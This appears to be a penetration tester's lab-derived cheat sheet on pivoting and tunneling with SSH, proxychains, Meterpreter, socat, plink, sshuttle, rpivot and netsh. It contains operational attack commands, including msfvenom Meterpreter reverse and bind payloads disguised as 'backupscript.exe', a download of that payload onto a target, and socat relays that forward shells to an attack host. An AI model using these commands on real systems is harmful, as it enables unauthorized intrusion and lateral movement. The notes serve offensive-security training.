# Pivoting, Tunneling, and Port Forwarding
- [Dynamic Port Forwarding with SSH and SOCKS Tunneling](#dynamic-port-forwarding-with-ssh-and-socks-tunneling)
    - [SSH Local Port Forwarding](#ssh-local-port-forwarding)
    - [Dynamic port forwarding with SSH over SOCKS](#dynamic-port-forwarding-with-ssh-over-socks)
- [Remote/Reverse Port Forwarding with SSH](#remotereverse-port-forwarding-with-ssh)
- [Meterpreter Tunneling & Port Forwarding](#meterpreter-tunneling--port-forwarding)
    - [Port Forwarding](#port-forwarding)
    - [Meterpreter Reverse Port Forwarding](#meterpreter-reverse-port-forwarding)
- [Socat](#socat)
    - [Socat Redirection with a Reverse Shell](#socat-redirection-with-a-reverse-shell)
    - [Socat Redirection with a Bind Shell](#socat-redirection-with-a-bind-shell)
- [SSH for Windows: plink.exe (Windows-based attack host)](#ssh-for-windows-plinkexe-windows-based-attack-host)
- [SSH Pivoting with Sshuttle](#ssh-pivoting-with-sshuttle)
- [Web Server Pivoting with Rpivot](#web-server-pivoting-with-rpivot)
- [Port Forwarding with Windows Netsh](#port-forwarding-with-windows-netsh)


--------------------------------------------------------------------------------------------------------------------
![Pivoting](/images/PivotingandTunnelingVisualized.gif)

> [!NOTE]
> Lateral Movement helps us spread wide within a network, elevating our privileges, while Pivoting allows us to delve deeper into the networks accessing previously unreachable environments.

> [!TIP]
> Use [Draw.io](https://app.diagrams.net/) to build a visual of the network environment


## Dynamic Port Forwarding with SSH and SOCKS Tunneling
### SSH Local Port Forwarding
```bash
# Local port forwarding
ssh -L LOCAL_PORT:SERVER:PORT HOST@TARGET_IP
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64

# Forwarding multiple ports
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64

# Confirming Port Forward with Netstat
netstat -antp
```
- The `-L` command tells the SSH client to request the SSH server to forward all the data we send via the port 1234 to localhost:3306 on the Ubuntu server. 

### Dynamic port forwarding with SSH over SOCKS 
- Using Dynamic port forwarding we can send packets to a remote network via a pivot host.
- SOCKS proxies are currently of two types: SOCKS4 and SOCKS5. SOCKS4 doesn't provide any authentication and UDP support, whereas SOCKS5 does provide that.
- We do this by starting a SOCKS listener on our local host (personal attack host or Pwnbox) and then configure SSH to forward that traffic via SSH to the network after connecting to the target host.

- Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host.

- To inform proxychains that we must use specific port, we must modify the proxychains configuration file located at `/etc/proxychains.conf`.
![SSH Tunneling over SOCKS Proxy](/images/SSH%20tunneling%20over%20socks%20proxy.png)

```bash
# Enabling Dynamic Port Forwarding with SSH
ssh -D 9050 -C -N -f ubuntu@10.129.202.64

# -C — compress all data;
# -N — do not execute remote command or shell;
# -f — run in background.

# We add socks5 127.0.0.1 9050 to the last line of /etc/proxychains.conf file
sudo nano /etc/proxychains.conf
socks5 127.0.0.1 9050

# Using Nmap with Proxychains
proxychains nmap -v -sn 172.16.5.1-200

# We can also use other tools with proxychains
proxychains msfconsole
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

```

> [!NOTE]
> This part of packing all your Nmap data using proxychains and forwarding it to a remote server is called SOCKS tunneling.


> [!WARNING]
> One more important note to remember here is that we can only perform a full TCP connect scan over proxychains.

## Remote/Reverse Port Forwarding with SSH
![Remote Port Forwarding](/images/Remote%20port%20forwarding.png)
- **Steps**
1. Creating a Windows Payload with msfvenom (LPORT is listener port of Pivot host): `msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080`

2. Configuring & Starting the multi/handler: `set payload windows/x64/meterpreter/reverse_https` , `set lhost 0.0.0.0` , `set lport 8000`

3. Transferring Payload to Pivot Host: `scp backupscript.exe ubuntu@<ipAddressofTarget>:~/`

4. Starting Python3 Webserver on Pivot Host: `python3 -m http.server 8123`

5. Downloading Payload from Windows Target: `PS C:\Windows\system32> Invoke-WebRequest -Uri "http://<InternalPivotHostIP>:8123/backupscript.exe" -OutFile "C:\backupscript.exe"`

6. We will use SSH remote port forwarding to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000: `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN`

## Meterpreter Tunneling & Port Forwarding
- **Steps**
1. Scanning Internal Network: 
- Assume that we have a meterpreter, we would want to perform a ping sweep on the internal network. We can do that using Meterpreter with the ping_sweep module: `meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`.

> [!TIP]
> We could also perform a ping sweep using a for loop directly on a target pivot host that will ping any device in the network range we specify: 
> - On linux pivot host: `for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done`
> - On windows pivot host Using CMD: `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"`
> - On windows pivot host Using powershell: `1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}`

> [!NOTE]
> It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build it's arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built.

2. Dynamic Port Forwarding: Instead of using SSH for port forwarding, we can use Metasploit's post-exploitation routing module socks_proxy to configure a local proxy on our attack host.We will configure the SOCKS proxy for SOCKS version 4a. This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session. 
    1. Configuring MSF's SOCKS Proxy:    
    ```bash
    msf6 > use auxiliary/server/socks_proxy
    msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
    SRVPORT => 9050
    msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
    SRVHOST => 0.0.0.0
    msf6 auxiliary(server/socks_proxy) > set version 4a
    version => 4a
    msf6 auxiliary(server/socks_proxy) > run
    ```
    2. Confirming Proxy Server is Running: `msf6 auxiliary(server/socks_proxy) > jobs`
    3. After initiating the SOCKS server, we will configure proxychains to route traffic generated by other tools like Nmap through our pivot on the compromised Ubuntu host, edit /etc/proxychains.conf: `socks5 127.0.0.1 9050`
    4. We need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the post/multi/manage/autoroute module from Metasploit to add routes for the internal subnet and then route all our proxychains traffic.
    ```bash
    msf6 > use post/multi/manage/autoroute

    msf6 post(multi/manage/autoroute) > set SESSION 1
    SESSION => 1
    msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
    SUBNET => 172.16.5.0
    msf6 post(multi/manage/autoroute) > run
    ```
    5. Listing Active Routes with AutoRoute: `meterpreter > run autoroute -p`

> [!TIP]
> It is also possible to add routes with autoroute by running autoroute from the Meterpreter session: `meterpreter > run autoroute -s 172.16.5.0/23`

    
3. Testing Proxy & Routing Functionality: `proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn`    

### Port Forwarding
- Using Meterpreter's portfwd module. 
    - `meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19`.This command requests the Meterpreter session to start a listener on our attack host's local port (-l) 3300 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3389 port (-p) via our Meterpreter session.

### Meterpreter Reverse Port Forwarding
- We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port 1234 to our listener on port 8081.
- **Steps**
    1. This command forwards all connections on port 1234 running on the Ubuntu server to our attack host on local port (-l) 8081. We will also configure our listener to listen on port 8081 for a Windows shell: `meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18`

    2. Then, we background the meterpreter, use multi handler and listen on 8081 port and we can now create a reverse shell payload that will send a connection back to our Ubuntu server on `172.16.5.129:1234` when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to `attack host's ip:8081` that we configured.


## Socat 
### Socat Redirection with a Reverse Shell
- Socat is a bidirectional relay tool that can create pipe sockets between 2 independent network channels without needing to use SSH tunneling.
```
PivotHost@victim:~$ socat TCP4-LISTEN:8080,fork TCP4:ATTACK_HOST:80
```
- Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host

### Socat Redirection with a Bind Shell
- Windows server will start a listener and bind to a particular port. We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target. The below figure should explain the pivot in a much better way.

![Socat bindshell](/images/Socat%20bind%20shell.png)

```bash
# Creating the Windows Payload
abdeonix@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443

# Starting Socat Bind Shell Listener
Pivot@Host:~$ socat TCP4-LISTEN:8080,fork TCP4:WINDOWS_HOST:8443

#Configuring & Starting the Bind multi/handler

msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST PIVOT_HOST
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > run
```

## SSH for Windows: plink.exe (Windows-based attack host)
- Plink, short for PuTTY Link, is a Windows command-line SSH tool that comes as a part of the PuTTY package when installed
- Similar to SSH, Plink can also be used to create dynamic port forwards and SOCKS proxies.

![Plink](/images/plink.png)

- **Steps**
    1. The Windows attack host starts a plink.exe process with the below command-line arguments to start a dynamic port forward over the Ubuntu server.This starts an SSH session between the Windows attack host and the Ubuntu server, and then plink starts listening on port 9050: `plink -ssh -D 9050 ubuntu@10.129.15.50`
    2. 
    - Another Windows-based tool called Proxifier can be used to start a SOCKS tunnel via the SSH session we created. 
    - It is possible to create a profile where we can provide the configuration for our SOCKS server started by Plink on port 9050.
    ![proxifier](/images/proxifier.png)
    - After configuring the SOCKS server for 127.0.0.1 and port 9050, we can directly start mstsc.exe to start an RDP session with a Windows target that allows RDP connections.

## SSH Pivoting with Sshuttle

- [Sshuttle](https://github.com/sshuttle/sshuttle) is another tool written in Python which removes the need to configure proxychains.
- This tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers.

- To use sshuttle, we specify the option `-r` to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23: `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v`

- With the previous command, sshuttle creates an entry in our iptables to redirect all traffic to the 172.16.5.0/23 network through the pivot host.

## Web Server Pivoting with Rpivot

- [Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python for SOCKS tunneling.

- Installation:
```bash
abdeonix@htb[/htb]$ git clone https://github.com/klsecservices/rpivot.git
abdeonix@htb[/htb]$ sudo apt-get install python2.7

# Alternative Installation of Python2.7
abdeonix@htb[/htb]$ curl https://pyenv.run | bash
abdeonix@htb[/htb]$ echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
abdeonix@htb[/htb]$ echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
abdeonix@htb[/htb]$ echo 'eval "$(pyenv init -)"' >> ~/.bashrc
abdeonix@htb[/htb]$ source ~/.bashrc
abdeonix@htb[/htb]$ pyenv install 2.7
abdeonix@htb[/htb]$ pyenv shell 2.7
```
- **Steps**
    1. We can start our rpivot SOCKS proxy server using the below command to allow the client to connect on port 9999 and listen on port 9050 for proxy pivot connections.We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using server.py.
```bash
    # Running server.py from the Attack Host
    abdeonix@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

    # Transfering rpivot to the Target
    abdeonix@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/

    # Running client.py from Pivot Target
    ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip ATTACK_HOST --server-port 9999

    # Confirming Connection is Established
    New connection from host 10.129.202.64, source port 35226
```

    2. We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.



> [!NOTE]
> Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have HTTP-proxy with NTLM authentication configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way: `python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>`

## Port Forwarding with Windows Netsh
- Netsh is a Windows command-line tool that can help with the network configuration of a particular Windows system.
![Netsh](/images/Netsh.png)

- We can use netsh.exe to forward all data received on a specific port (say 8080) to a remote host on a remote port. This can be performed using the below command.
```CMD
# Using Netsh.exe to Port Forward
C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25

# Verifying Port Forward
C:\Windows\system32> netsh.exe interface portproxy show v4tov4

```